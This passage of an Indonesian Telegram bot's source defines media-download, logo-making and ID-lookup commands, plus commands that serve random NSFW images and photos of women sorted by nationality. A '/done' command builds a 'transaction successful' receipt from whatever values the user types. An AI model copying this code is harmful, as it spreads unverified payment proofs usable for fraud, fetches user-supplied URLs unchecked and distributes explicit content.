    loadingMsg = await sendLoading(ctx, '⏳ Mengambil info dari Mediafire...');
    
    const apiUrl = `https://api.nekolabs.web.id/downloader/mediafire?url=${encodeURIComponent(args)}`;
    const response = await axios.get(apiUrl, { timeout: 30000 });
    const data = response.data;
    
    if (data && data.success && data.result) {
      const result = data.result;
      let caption = `<blockquote>📁 <b>Mediafire Download</b></blockquote>\n\n`;
      caption += `<blockquote>📄 Nama File: ${result.filename || '-'}</blockquote>\n`;
      caption += `<blockquote>📦 Ukuran: ${result.filesize || '-'}</blockquote>\n`;
      caption += `<blockquote>🔗 Link: ${result.url || '-'}</blockquote>\n`;
      if (result.upload_date) caption += `<blockquote>📅 Upload: ${result.upload_date}</blockquote>\n`;
      
      await ctx.deleteMessage(loadingMsg.message_id);
      await ctx.reply(caption, { parse_mode: 'HTML' });
      
      console.log(chalk.green(`✅ Mediafire info retrieved for: ${args}`));
    } else {
      await editLoading(loadingMsg, '<blockquote>❌ Gagal mengambil data dari Mediafire.</blockquote>');
    }
  } catch (error) {
    console.error(chalk.red(`❌ Mediafire error: ${error.message}`));
    const errorMessage = '<blockquote>❌ Gagal mengambil data. Pastikan link Mediafire valid.</blockquote>';
    
    if (loadingMsg) {
      await editLoading(loadingMsg, errorMessage);
    } else {
      await ctx.reply(`${errorMessage}`, { parse_mode: 'HTML' });
    }
  }
});

/// -------------------- [ Command : spotify ] -------------------- \\\
bot.command('spotify', async (ctx) => {
  const args = ctx.message.text.trim().split(' ');
  if (!(await checkUserLimit(ctx, 'spotify'))) return;
  
  if (args.length < 2) {
    return ctx.reply('<blockquote>❌ Format salah!</blockquote>\n\n<blockquote>Gunakan: /spotify &lt;query&gt;</blockquote>\n\n<blockquote>Contoh: /spotify coldplay yellow</blockquote>', { parse_mode: 'HTML' });
  }
  
  const query = args.slice(1).join(' ').trim();
  let loadingMsg;
  
  try {
    loadingMsg = await sendLoading(ctx, '⏳ Mencari lagu di Spotify...');
    
    const apiUrl = `https://faa-jian.my.id/search/spotify?q=${encodeURIComponent(query)}`;
    const response = await axios.get(apiUrl, { timeout: 15000 });
    const data = response.data;
    
    if (!data || !data.status || !data.download) {
      await editLoading(loadingMsg, '<blockquote>❌ Lagu tidak ditemukan!</blockquote>');
      return;
    }
    
    await editLoading(loadingMsg, '<blockquote>🎵 Mengirim lagu...</blockquote>');
    await ctx.replyWithAudio({ url: data.download }, { 
      caption: '<blockquote>🎵 <b>Spotify Download</b></blockquote>', 
      parse_mode: 'HTML' 
    });
    
    await ctx.deleteMessage(loadingMsg.message_id);
    console.log(chalk.green(`✅ Spotify song downloaded: ${query}`));
  } catch (error) {
    console.error(chalk.red(`❌ Spotify download error: ${error.message}`));
    const errorMessage = '<blockquote>❌ Error: Gagal mendownload lagu dari Spotify.</blockquote>';
    
    if (loadingMsg) {
      await editLoading(loadingMsg, errorMessage);
    } else {
      await ctx.reply(`${errorMessage}`, { parse_mode: 'HTML' });
    }
  }
});

/// -------------------- [ Command : yt ] -------------------- \\\
bot.command('yt', async (ctx) => {
  const args = ctx.message.text.split(' ').slice(1).join(' ').trim();
  if (!(await checkUserLimit(ctx, 'yt'))) return;
  
  if (!args) {
    return ctx.reply('<blockquote>⚠️ Kirim link YouTube!</blockquote>\n<blockquote>Contoh: /yt https://youtube.com/watch?v=xxxx</blockquote>', { parse_mode: 'HTML' });
  }
  
  let loadingMsg;
  
  try {
    loadingMsg = await sendLoading(ctx, '⏳ Mengunduh video YouTube...');
    
    const apiUrl = `https://api.akuari.my.id/downloader/youtube?url=${encodeURIComponent(args)}`;
    const response = await axios.get(apiUrl, { timeout: 30000 });
    const data = response.data;
    
    if (!data || !data.respon) {
      await editLoading(loadingMsg, '<blockquote>❌ Gagal mengambil video YouTube.</blockquote>');
      return;
    }
    
    const videoUrl = data.respon.url;
    
    await editLoading(loadingMsg, '<blockquote>🎬 Mengirim video...</blockquote>');
    await ctx.replyWithVideo({ url: videoUrl }, { 
      caption: '<blockquote>🎬 <b>YouTube Download</b></blockquote>', 
      parse_mode: 'HTML' 
    });
    
    await ctx.deleteMessage(loadingMsg.message_id);
    console.log(chalk.green(`✅ YouTube download completed for: ${args}`));
  } catch (error) {
    console.error(chalk.red(`❌ YouTube error: ${error.message}`));
    const errorMessage = '<blockquote>❌ Gagal mengunduh video YouTube.</blockquote>';
    
    if (loadingMsg) {
      await editLoading(loadingMsg, errorMessage);
    } else {
      await ctx.reply(`${errorMessage}`, { parse_mode: 'HTML' });
    }
  }
});

/// -------------------- [ Command : nsfwrandom ] -------------------- \\\
bot.command('nsfwrandom', async (ctx) => {
  const userId = ctx.from.id.toString();
  if (!(await checkUserLimit(ctx, 'nsfwrandom'))) return;
  
  try {
    await ctx.reply('<blockquote>⏳ Sabar bree...</blockquote>', { parse_mode: 'HTML' });
    
    let imageUrl = null;
    for (const api of NSFW_APIS) {
      try {
        const url = await api();
        if (typeof url === 'string' && url.startsWith('http')) {
          imageUrl = url;
          break;
        }
      } catch (e) {
        console.warn('ERROR:', e && e.message ? e.message : e);
      }
    }
    
    if (!imageUrl) return ctx.reply('<blockquote>❌ Gagal Bree</blockquote>', { parse_mode: 'HTML' });
    
    const img = await axios.get(imageUrl, { 
      responseType: 'arraybuffer', 
      timeout: 30000, 
      headers: { 'User-Agent': 'Mozilla/5.0' } 
    });
    
    const buffer = Buffer.from(img.data);
    await ctx.replyWithPhoto({ source: buffer }, { 
      caption: '<blockquote>🔞 <b>DONE BRE 🗿😋</b></blockquote>', 
      parse_mode: 'HTML' 
    });
  } catch (err) {
    console.error('FATAL:', err);
    await ctx.reply('<blockquote>❌ Fatal error saat mengambil Api.</blockquote>', { parse_mode: 'HTML' });
  }
});

/// -------------------- [ Command : asupan ] -------------------- \\\
bot.command('asupan', async (ctx) => {
  const userId = ctx.from.id.toString();
  if (!(await checkUserLimit(ctx, 'asupan'))) return;
  
  try {
    await ctx.reply('<blockquote>⏳ sabar bre...</blockquote>', { parse_mode: 'HTML' });
    
    const API_URL = 'http://api.deline.web.id/random/asupan';
    let videoUrl = null;
    
    try {
      const res = await axios.get(API_URL, { timeout: 20000 });
      const data = res.data;
      
      if (!data) {
      } else if (typeof data === 'string') {
        if (data.startsWith('http')) videoUrl = data;
      } else if (typeof data === 'object') {
        videoUrl = data.url || data.video || data.result || data.data || data.link || data.src || data.file;
        if (!videoUrl) {
          for (const k of Object.keys(data)) {
            const v = data[k];
            if (typeof v === 'string' && v.startsWith('http')) {
              videoUrl = v;
              break;
            }
          }
        }
      }
    } catch (e) {
      console.warn('Gagal parse JSON API asupan:', e && e.message ? e.message : e);
    }
    
    if (!videoUrl) {
      try {
        const head = await axios.get(API_URL, { timeout: 20000, maxRedirects: 0, validateStatus: (s) => s >= 200 && s < 400 });
        if (typeof head.data === 'string' && head.data.startsWith('http')) {
          videoUrl = head.data;
        }
      } catch (e) { }
    }
    
    if (!videoUrl) {
      try {
        const raw = await axios.get(API_URL, { 
          responseType: 'arraybuffer', 
          timeout: 30000, 
          headers: { 'User-Agent': 'Mozilla/5.0' } 
        });
        const contentType = (raw.headers && raw.headers['content-type']) || '';
        if (contentType.startsWith('video/')) {
          const bufferDirect = Buffer.from(raw.data);
          return await ctx.replyWithVideo({ source: bufferDirect }, { 
            caption: '<blockquote><b>🎬 DONE BRE</b></blockquote>', 
            parse_mode: 'HTML' 
          });
        }
      } catch (e) { }
      
      return ctx.reply('<blockquote>❌ Gagal mendapatkan URL video dari API asupan.</blockquote>', { parse_mode: 'HTML' });
    }
    
    if (typeof videoUrl !== 'string' || !videoUrl.startsWith('http')) {
      return ctx.reply('<blockquote>❌ Response API tidak berisi URL video yang valid.</blockquote>', { parse_mode: 'HTML' });
    }
    
    const vidResp = await axios.get(videoUrl, { 
      responseType: 'arraybuffer', 
      timeout: 60000, 
      headers: { 'User-Agent': 'Mozilla/5.0' } 
    });
    
    const bufferVid = Buffer.from(vidResp.data);
    await ctx.replyWithVideo({ source: bufferVid }, { 
      caption: '<blockquote><b>🎬 DONE BRE</b></blockquote>', 
      parse_mode: 'HTML' 
    });
  } catch (err) {
    console.error('FATAL (asupan):', err);
    await ctx.reply('<blockquote>❌ Error saat mengambil atau mengirim video asupan.</blockquote>', { parse_mode: 'HTML' });
  }
});

/// -------------------- [ Command : createlogo ] -------------------- \\\
bot.command('createlogo', async (ctx) => {
  const args = ctx.message.text.split(' ').slice(1);
  if (!(await checkUserLimit(ctx, 'createlogo'))) return;
  
  if (args.length < 2) {
    return ctx.reply('<blockquote>❌ Gunakan format:</blockquote>\n<blockquote>/createlogo AldzyIsHere https://files.catbox.moe/abcd12.jpg</blockquote>', { parse_mode: 'HTML' });
  }
  
  const userImg = args[args.length - 1];
  const name = args.slice(0, -1).join(' ');
  
  const bgs = [
    'https://files.catbox.moe/l884dq.jpg',
    'https://files.catbox.moe/yj1eex.jpg',
    'https://files.catbox.moe/ycdbjl.jpg',
    'https://files.catbox.moe/8kimfa.jpg',
    'https://files.catbox.moe/kc5rhx.jpg',
    'https://files.catbox.moe/al57k1.jpg',
  ];
  
  const randomBg = bgs[Math.floor(Math.random() * bgs.length)];
  
  try {
    async function safeLoad(url) {
      const tmpPath = path.join(__dirname, `tmp_${Date.now()}.jpg`);
      const response = await axios.get(url, { responseType: 'arraybuffer', timeout: 10000 });
      fs.writeFileSync(tmpPath, response.data);
      const img = await loadImage(tmpPath);
      fs.unlinkSync(tmpPath);
      return img;
    }
    
    const bg = await safeLoad(randomBg);
    const img = await safeLoad(userImg);
    
    const canvas = createCanvas(700, 700);
    const ctx2 = canvas.getContext('2d');
    
    ctx2.drawImage(bg, 0, 0, 700, 700);
    
    const centerX = 350;
    const centerY = 390;
    const radius = 170;
    
    ctx2.save();
    ctx2.beginPath();
    ctx2.arc(centerX, centerY, radius, 0, Math.PI * 2);
    ctx2.closePath();
    ctx2.clip();
    ctx2.drawImage(img, centerX - radius, centerY - radius, radius * 2, radius * 2);
    ctx2.restore();
    
    const text = name.toUpperCase();
    const arcRadius = 210;
    const startAngle = Math.PI * 1.25;
    const endAngle = Math.PI * 1.75;
    const baseSpacing = 0.7;
    const lenFactor = Math.min(text.length / 8, 1);
    const angleStep = ((endAngle - startAngle) * (baseSpacing + lenFactor * 0.5)) / text.length;
    
    ctx2.font = 'bold 60px sans-serif';
    ctx2.fillStyle = '#ff2e2e';
    ctx2.strokeStyle = '#000';
    ctx2.lineWidth = 6;
    ctx2.textAlign = 'center';
    ctx2.textBaseline = 'middle';
    
    const textStart = startAngle + ((endAngle - startAngle) - angleStep * (text.length - 1)) / 2;
    
    for (let i = 0; i < text.length; i++) {
      const angle = textStart + i * angleStep;
      const x = centerX + arcRadius * Math.cos(angle);
      const y = centerY + arcRadius * Math.sin(angle);
      
      ctx2.save();
      ctx2.translate(x, y);
      ctx2.rotate(angle + Math.PI / 2);
      ctx2.strokeText(text[i], 0, 0);
      ctx2.fillText(text[i], 0, 0);
      ctx2.restore();
    }
    
    const buffer = canvas.toBuffer('image/png');
    
    await ctx.replyWithPhoto({ source: buffer }, { 
      caption: '<blockquote>✅ Logo berhasil dibuat!</blockquote>', 
      parse_mode: 'HTML' 
    });
  } catch (err) {
    console.error('Logo Error:', err);
    ctx.reply('<blockquote>⚠️ Gagal membuat logo.</blockquote>\n<blockquote>Pastikan URL gambar valid dan bisa diakses publik.</blockquote>', { parse_mode: 'HTML' });
  }
});

/// -------------------- [ Command : logoarchive ] -------------------- \\\
bot.command('logoarchive', async (ctx) => {
  try {
    const args = ctx.message.text.split(' ').slice(1);
    if (!(await checkUserLimit(ctx, 'logoarchive'))) return;
    
    if (args.length === 0) return ctx.reply('<blockquote>❗ Contoh:</blockquote>\n<blockquote>/logoarchive AldzyIsHere</blockquote>', { parse_mode: 'HTML' });
    
    const textL = args[0];
    const textR = args.slice(1).join(' ') || 'Archive';
    
    const url = `https://api.nekolabs.web.id/canvas/ba-logo?textL=${encodeURIComponent(textL)}&textR=${encodeURIComponent(textR)}`;
    
    await ctx.replyWithPhoto({ url }, { 
      caption: `<blockquote>🖼️ Logo Archive</blockquote>\n<blockquote>${textL} ${textR}</blockquote>`, 
      parse_mode: 'HTML' 
    });
  } catch (e) {
    console.error(e);
    ctx.reply('<blockquote>❌ Gagal generate logo.</blockquote>', { parse_mode: 'HTML' });
  }
});

/// -------------------- [ Command : cecanjapan ] -------------------- \\\
bot.command('cecanjapan', async (ctx) => {
  if (!(await checkUserLimit(ctx, 'cecanjapan'))) return;
  
  await ctx.reply('<blockquote>📸 Mengambil foto cecan Jepang...</blockquote>', { parse_mode: 'HTML' });
  
  try {
    const response = await axios.get('https://api.kyuuimut.my.id/cecan/japan', { responseType: 'arraybuffer' });
    const buffer = Buffer.from(response.data, 'binary');
    
    await ctx.replyWithPhoto({ source: buffer }, { 
      caption: '<blockquote>💖 Cecan Jepang random 𝗎𝗇𝗍𝗎𝗄𝗆𝗎</blockquote>', 
      reply_markup: { inline_keyboard: buttonsBot } 
    });
  } catch (err) {
    console.error('[CecanJapan] Error:', err.message);
    ctx.reply('<blockquote>❌ Gagal mengambil foto.</blockquote>', { parse_mode: 'HTML' });
  }
});

/// -------------------- [ Command : cecanvietnam ] -------------------- \\\
bot.command('cecanvietnam', async (ctx) => {
  if (!(await checkUserLimit(ctx, 'cecanvietnam'))) return;
  
  try {
    await ctx.reply('<blockquote>🇻🇳 Lagi nyari cewek Vietnam cantik buat kamu...</blockquote>', { parse_mode: 'HTML' });
    
    const apiUrl = 'https://api.kyuuimut.my.id/cecan/vietnam';
    const response = await axios.get(apiUrl, { responseType: 'arraybuffer', timeout: 60000 });
    const caption = `<blockquote>💖 <b>Cewek Vietnam Random 💖</b></blockquote>\n<blockquote>Ditemuin khusus buat kamu~</blockquote>`;
    
    await ctx.replyWithPhoto({ source: Buffer.from(response.data) }, { 
      caption, 
      parse_mode: 'HTML', 
      reply_markup: { inline_keyboard: buttonsBot } 
    });
  } catch (e) {
    console.error(e);
    ctx.reply(`<blockquote>❌ <b>Gagal ambil gambar:</b> ${e.message}</blockquote>`, {
      parse_mode: 'HTML',
      reply_markup: { inline_keyboard: [[{ text: '─ Contact Owner', url: 'https://t.me/ReyValdz' }]] },
    });
  }
});

/// -------------------- [ Command : cecanthailand ] -------------------- \\\
bot.command('cecanthailand', async (ctx) => {
  if (!(await checkUserLimit(ctx, 'cecanthailand'))) return;
  
  try {
    await ctx.reply('<blockquote>🇹🇭 Lagi nyari cewek Thailand cantik buat kamu...</blockquote>', { parse_mode: 'HTML' });
    
    const apiUrl = 'https://api.kyuuimut.my.id/cecan/thailand';
    const response = await axios.get(apiUrl, { responseType: 'arraybuffer', timeout: 60000 });
    const caption = `<blockquote>💖 <b>Cewek Thailand Random 💖</b></blockquote>\n<blockquote>Ditemuin khusus buat kamu~</blockquote>`;
    
    await ctx.replyWithPhoto({ source: Buffer.from(response.data) }, { 
      caption, 
      parse_mode: 'HTML', 
      reply_markup: { inline_keyboard: buttonsBot } 
    });
  } catch (e) {
    console.error(e);
    ctx.reply(`<blockquote>❌ <b>Gagal ambil gambar:</b> ${e.message}</blockquote>`, {
      parse_mode: 'HTML',
      reply_markup: { inline_keyboard: [[{ text: '─ Contact Owner', url: 'https://t.me/ReyValdz' }]] },
    });
  }
});

/// -------------------- [ Command : cecankorea ] -------------------- \\\
bot.command('cecankorea', async (ctx) => {
  if (!(await checkUserLimit(ctx, 'cecankorea'))) return;
  
  try {
    await ctx.reply('<blockquote>🇰🇷 Lagi nyari cewek Korea cantik buat kamu...</blockquote>', { parse_mode: 'HTML' });
    
    const apiUrl = 'https://api.kyuuimut.my.id/cecan/korea';
    const response = await axios.get(apiUrl, { responseType: 'arraybuffer', timeout: 60000 });
    const caption = `<blockquote>💖 <b>Cewek Korea Random 💖</b></blockquote>\n<blockquote>Ditemuin khusus buat kamu~</blockquote>`;
    
    await ctx.replyWithPhoto({ source: Buffer.from(response.data) }, { 
      caption, 
      parse_mode: 'HTML', 
      reply_markup: { inline_keyboard: buttonsBot } 
    });
  } catch (e) {
    console.error(e);
    ctx.reply(`<blockquote>❌ <b>Gagal ambil gambar:</b> ${e.message}</blockquote>`, {
      parse_mode: 'HTML',
      reply_markup: { inline_keyboard: [[{ text: '─ Contact Owner', url: 'https://t.me/ReyValdz' }]] },
    });
  }
});

/// -------------------- [ Command : cecanindo ] -------------------- \\\
bot.command('cecanindo', async (ctx) => {
  if (!(await checkUserLimit(ctx, 'cecanindo'))) return;
  
  try {
    await ctx.reply('<blockquote>🇮🇩 Lagi nyari cewek Indo cantik buat kamu...</blockquote>', { parse_mode: 'HTML' });
    
    const apiUrl = 'https://api.kyuuimut.my.id/cecan/indonesia';
    const response = await axios.get(apiUrl, { responseType: 'arraybuffer', timeout: 60000 });
    const caption = `<blockquote>💖 <b>Cewek Indonesia Random 💖</b></blockquote>\n<blockquote>Ditemuin khusus buat kamu~</blockquote>`;
    
    await ctx.replyWithPhoto({ source: Buffer.from(response.data) }, { 
      caption, 
      parse_mode: 'HTML', 
      reply_markup: { inline_keyboard: buttonsBot } 
    });
  } catch (e) {
    console.error(e);
    ctx.reply(`<blockquote>❌ <b>Gagal ambil gambar:</b> ${e.message}</blockquote>`, {
      parse_mode: 'HTML',
      reply_markup: { inline_keyboard: [[{ text: '─ Contact Owner', url: 'https://t.me/ReyValdz' }]] },
    });
  }
});

/// -------------------- [ Command : cecanchina ] -------------------- \\\
bot.command('cecanchina', async (ctx) => {
  if (!(await checkUserLimit(ctx, 'cecanchina'))) return;
  
  try {
    await ctx.reply('<blockquote>🇨🇳 Lagi nyari cewek China cantik buat kamu...</blockquote>', { parse_mode: 'HTML' });
    
    const apiUrl = 'https://api.kyuuimut.my.id/cecan/china';
    const response = await axios.get(apiUrl, { responseType: 'arraybuffer', timeout: 60000 });
    const caption = `<blockquote>💖 <b>Cewek China Random 💖</b></blockquote>\n<blockquote>Ditemuin khusus buat kamu~</blockquote>`;
    
    await ctx.replyWithPhoto({ source: Buffer.from(response.data) }, { 
      caption, 
      parse_mode: 'HTML', 
      reply_markup: { inline_keyboard: buttonsBot } 
    });
  } catch (e) {
    console.error(e);
    ctx.reply(`<blockquote>❌ <b>Gagal ambil gambar:</b> ${e.message}</blockquote>`, {
      parse_mode: 'HTML',
      reply_markup: { inline_keyboard: [[{ text: '─ Contact Owner', url: 'https://t.me/ReyValdz' }]] },
    });
  }
});

/// -------------------- [ Command : cecancosplay ] -------------------- \\\
bot.command('cecanrendom', async (ctx) => {
  if (!(await checkUserLimit(ctx, 'cecancosplay'))) return;
  
  try {
    await ctx.reply('<blockquote>🌷 Lagi nyari cewek cantik buat kamu...</blockquote>', { parse_mode: 'HTML' });
    
    const apiUrl = 'https://api.kyuuimut.my.id/cecan/cewerandom';
    const response = await axios.get(apiUrl, { responseType: 'arraybuffer', timeout: 60000 });
    const caption = `<blockquote>💖 <b>Cewek Random 💖</b></blockquote>\n<blockquote>Ditemuin khusus buat kamu~</blockquote>`;
    
    await ctx.replyWithPhoto({ source: Buffer.from(response.data) }, { 
      caption, 
      parse_mode: 'HTML', 
      reply_markup: { inline_keyboard: buttonsBot } 
    });
  } catch (e) {
    console.error(e);
    ctx.reply(`<blockquote>❌ <b>Gagal ambil gambar:</b> ${e.message}</blockquote>`, {
      parse_mode: 'HTML',
      reply_markup: { inline_keyboard: [[{ text: '─ Contact Owner', url: 'https://t.me/ReyValdz' }]] },
    });
  }
});

/// -------------------- [ Command : tiktoksearch ] -------------------- \\\
bot.command("tiktoksearch", async (ctx) => {
  const query = ctx.message.text.split(" ").slice(1).join(" ");
  if (!query) return ctx.reply("<blockquote>❌ Gunakan:</blockquote>\n<blockquote>/tiktoksearch yesaoktavia</blockquote>", { parse_mode: 'HTML' });

  try {
    const axios = require("axios");
    const q = encodeURIComponent(query);

    const { data } = await axios.get(
      `https://api-ikyyofficiall-latest.vercel.app/search/tiktok?apikey=kyzz&query=${q}`
    );

    if (!data.status || !data.result.length)
      return ctx.reply("<blockquote>❌ Tidak ada hasil!</blockquote>", { parse_mode: 'HTML' });

    const vid = data.result[0];

    await ctx.reply("<blockquote>⏳ Mengambil video...</blockquote>", { parse_mode: 'HTML' });

    await ctx.replyWithVideo(
      { url: vid.play },
      {
        caption: `<blockquote>🎬 ${vid.title || "Tanpa Judul"}</blockquote>\n<blockquote>👤 ${vid.author?.nickname || "Unknown"}\n▶️ Views: ${vid.play_count}\n❤️ Likes: ${vid.digg_count}\n\nKlik tombol di bawah untuk download audionya.</blockquote>`,
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [{ text: "🎵 Download Audio", callback_data: `ttdl_${vid.music}` }]
          ]
        }
      }
    );

  } catch (e) {
    console.log(e);
    ctx.reply("<blockquote>❌ Error mengambil video.</blockquote>", { parse_mode: 'HTML' });
  }
});

/// -------------------- [ Command : spotifyplay ] -------------------- \\\
bot.command('spotifyplay', async (ctx) => {
  if (!(await checkUserLimit(ctx, 'spotifyplay'))) return;
  
  try {
    let query;
    if (ctx.message.reply_to_message?.text) {
      query = ctx.message.reply_to_message.text;
    } else {
      query = ctx.message.text.split(' ').slice(1).join(' ');
    }
    
    if (!query) return ctx.reply('<blockquote>❌ Masukkan judul lagu!</blockquote>\n<blockquote>Contoh: /spotifyplay Sparks</blockquote>', { parse_mode: 'HTML' });
    
    const api = `https://api.deline.web.id/downloader/spotifyplay?q=${encodeURIComponent(query)}`;
    const res = await fetch(api);
    
    if (!res.ok) return ctx.reply('<blockquote>❌ Gagal akses API.</blockquote>', { parse_mode: 'HTML' });
    
    const json = await res.json();
    if (!json.status) return ctx.reply('<blockquote>❌ Lagu tidak ditemukan.</blockquote>', { parse_mode: 'HTML' });
    
    const meta = json.result.metadata;
    const dlink = json.result.dlink;
    
    await ctx.replyWithPhoto({ url: meta.cover }, { 
      caption: `<blockquote>🎵 Judul: ${meta.title}</blockquote>\n<blockquote>👤 Artist: ${meta.artist}\n⏱ Durasi: ${meta.duration}</blockquote>`, 
      parse_mode: 'HTML' 
    });
    
    await ctx.replyWithAudio({ url: dlink }, { 
      title: meta.title, 
      performer: meta.artist, 
      thumb: { url: meta.cover } 
    });
  } catch (e) {
    console.error(e);
    ctx.reply('<blockquote>❌ Terjadi kesalahan saat memproses permintaan.</blockquote>', { parse_mode: 'HTML' });
  }
});

/// -------------------- [ Command : cekidchannel ] -------------------- \\\
bot.command('cekidchannel', async (ctx) => {
  try {
    if (!(await checkUserLimit(ctx, 'cekidchannel'))) return;
    
    const args = ctx.message.text.split(' ').slice(1);
    
    if (args[0]) {
      const channel = await ctx.telegram.getChat(args[0]);
      if (channel.type !== 'channel') return ctx.reply('<blockquote>❌ Itu bukan channel.</blockquote>', { parse_mode: 'HTML' });
      
      return ctx.reply(
        `<blockquote>🆔 <b>Channel ID Checker</b></blockquote>\n<blockquote>━━━━━━━━━━━━━━\n📢 Name: ${channel.title}\n🔗 Username: ${channel.username ? '@' + channel.username : '-'}\n🆔 ID: <code>${channel.id}</code></blockquote>`,
        { parse_mode: 'HTML' }
      );
    }
    
    if (ctx.chat.type === 'channel') {
      return ctx.reply(
        `<blockquote>🆔 <b>Channel ID Checker</b></blockquote>\n<blockquote>━━━━━━━━━━━━━━\n📢 Name: ${ctx.chat.title}\n🆔 ID: <code>${ctx.chat.id}</code></blockquote>`,
        { parse_mode: 'HTML' }
      );
    }
    
    ctx.reply('<blockquote>❗ Gunakan: <code>/cekidchannel @username_channel</code></blockquote>', { parse_mode: 'HTML' });
  } catch (err) {
    console.error(err);
    ctx.reply('<blockquote>❌ Gagal ambil info channel. pastikan bot punya akses.</blockquote>', { parse_mode: 'HTML' });
  }
});

/// -------------------- [ Command : cekidgroup ] -------------------- \\\
bot.command('cekidgroup', async (ctx) => {
  try {
    if (!(await checkUserLimit(ctx, 'cekidgroup'))) return;
    
    const args = ctx.message.text.split(' ').slice(1);
    
    if (args[0]) {
      const group = await ctx.telegram.getChat(args[0]);
      if (group.type !== 'group' && group.type !== 'supergroup') return ctx.reply('<blockquote>❌ Itu bukan group / supergroup.</blockquote>', { parse_mode: 'HTML' });
      
      return ctx.reply(
        `<blockquote>🆔 <b>Group ID Checker</b></blockquote>\n<blockquote>━━━━━━━━━━━━━━\n👥 Name: ${group.title}\n🔗 Username: ${group.username ? '@' + group.username : '-'}\n📂 Type: ${group.type}\n🆔 ID: ${group.id}</blockquote>`,
        { parse_mode: 'HTML' }
      );
    }
    
    if (ctx.chat.type === 'group' || ctx.chat.type === 'supergroup') {
      return ctx.reply(
        `<blockquote>🆔 <b>Group ID Checker</b></blockquote>\n<blockquote>━━━━━━━━━━━━━━\n👥 Name: ${ctx.chat.title}\n📂 Type: ${ctx.chat.type}\n🆔 ID: ${ctx.chat.id}</blockquote>`,
        { parse_mode: 'HTML' }
      );
    }
    
    ctx.reply('<blockquote>❗ Gunakan di group atau:</blockquote>\n<blockquote>/cekidgroup @username_group</blockquote>', { parse_mode: 'HTML' });
  } catch (err) {
    console.error(err);
    ctx.reply('<blockquote>❌ Gagal ambil id group. pastikan bot punya akses.</blockquote>', { parse_mode: 'HTML' });
  }
});

/// -------------------- [ Command : lobbyffmax ] -------------------- \\\
bot.command('lobbyffmax', async (ctx) => {
  try {
    if (!(await checkUserLimit(ctx, 'lobbyffmax'))) return;
    
    const text = ctx.message.text.split(' ').slice(1).join(' ') || 
                 (ctx.message.reply_to_message && (ctx.message.reply_to_message.text || ctx.message.reply_to_message.caption));
    
    if (!text) return ctx.reply(`<blockquote>⚠️ Masukkan teks!</blockquote>\n<blockquote>Contoh:\n/lobbyffmax AldzyIsHere? yeah</blockquote>`, { parse_mode: 'HTML' });
    
    const apiUrl = `https://api.deline.web.id/maker/lobbyffmax?text=${encodeURIComponent(text)}`;
    
    await ctx.replyWithPhoto({ url: apiUrl }, { 
      caption: `<blockquote>Lobby FF Max: ${text}</blockquote>`, 
      parse_mode: 'HTML' 
    });
  } catch (err) {
    console.error(err);
    ctx.reply('<blockquote>⚠️ Gagal mengambil gambar dari API!</blockquote>', { parse_mode: 'HTML' });
  }
});

/// -------------------- [ Command : qc ] -------------------- \\\
bot.command('qc', async (ctx) => {
  if (!(await checkUserLimit(ctx, 'qc'))) return;
  
  const text = ctx.message.text.split(' ').slice(1).join(' ');
  if (!text) return ctx.reply('<blockquote>📌 Contoh: /qc AldzyIsHere</blockquote>', { parse_mode: 'HTML' });
  if (text.length > 100) return ctx.reply('<blockquote>⚠️ Maksimal 100 karakter.</blockquote>', { parse_mode: 'HTML' });
  
  await ctx.reply('<blockquote>🔘 Pilih jenis warna</blockquote>', {
    parse_mode: 'HTML',
    reply_markup: {
      inline_keyboard: [
        [
          { text: '⬛ Hitam', callback_data: `qc_black|${encodeURIComponent(text)}` },
          { text: '⬜ Putih', callback_data: `qc_white|${encodeURIComponent(text)}` },
        ],
      ],
    },
  });
});

/// -------------------- [ Command : done ] -------------------- \\\
bot.command('done', async (ctx) => {
  if (!(await checkUserLimit(ctx, 'done'))) return;
  
  const replied = ctx.message.reply_to_message;
  if (!replied || !replied.photo) {
    return ctx.reply('<blockquote>⚠️ Raply Foto lu monyet</blockquote>', { parse_mode: 'HTML' });
  }

  const args = ctx.message.text.split(' ').slice(1).join(' ');
  if (!args || !args.includes('|')) {
    return ctx.reply(
      '<blockquote>⚠️ <b>Format salah</b>!</blockquote>\n<blockquote>/done Username|nama_produk|harga|payment</blockquote>',
      { parse_mode: 'HTML' }
    );
  }

  const [UserBuy, namaProduk, harga, payment] = args.split('|').map(x => x.trim());
  if (!UserBuy || !namaProduk || !harga || !payment) {
    return ctx.reply(
      '<blockquote>⚠️ Format salah!</blockquote>\n\n<blockquote>Contoh: /done nama|Panel Unli|5000|Dana</blockquote>',
      { parse_mode: 'HTML' }
    );
  }

  const waktu = moment().tz('Asia/Jakarta').format('DD/MM/YYYY');

  const text = `<blockquote>🖥️ <b>𝗧𝗥𝗔𝗡𝗦𝗔𝗞𝗦𝗜 𝗕𝗘𝗥𝗛𝗔𝗦𝗜𝗟!</b></blockquote>
<blockquote>👤 <b>𝖯𝖾𝗆𝖻𝖾𝗅𝗂:</b> ${UserBuy}
📦 <b>𝖯𝗋𝗈𝖽𝗎𝗄:</b> ${namaProduk}
💰 <b>𝖧𝖺𝗋𝗀𝖺:</b> Rp${Number(harga).toLocaleString('id-ID')}
💳 <b>𝖯𝖺𝗒𝗆𝖾𝗇𝗍:</b> ${payment}
🕒 <b>𝖶𝖺𝗄𝗍𝗎:</b> ${waktu}</blockquote>
<blockquote>🎉 <b>𝖳𝗋𝖺𝗇𝗌𝖺𝗄𝗌𝗂 𝖲𝗎𝖼𝖼𝖾𝗌𝗌𝖿𝗎𝗅!</b></blockquote>`;

  const buttons = {
    reply_markup: {
      inline_keyboard: [
        [
          { text: '-# 𝖮𝗐𝗇𝖾𝗋', url: 'https://t.me/ReyValdz' },
          { text: '-# 𝖢𝗁𝖺𝗇𝗇𝖾𝗅', url: 'https://t.me/Xtrol_Team' }
        ],
      ],
    },
  };

  const photoId = replied.photo[replied.photo.length - 1].file_id;
  await ctx.replyWithPhoto(photoId, {
    caption: text,
    parse_mode: 'HTML',
    ...buttons
  });
});

/// -------------------- [ Command : payment ] -------------------- \\\
bot.command("pay", async (ctx) => {
  const userId = ctx.from.id.toString();
  const chatId = ctx.chat.id;
  const username = ctx.from.username || ctx.from.first_name || 'User';
  
  // Cek premium
  const allowed = await sendIfNotPremium(ctx);
  if (!allowed) return;

  // Cek limit
  const limitAllowed = await checkUserLimit(ctx, "pay");
  if (!limitAllowed) return;

  const args = ctx.message.text.split(" ").slice(1);
  const nominalStr = args[0];

  if (!nominalStr) {
    return ctx.reply(
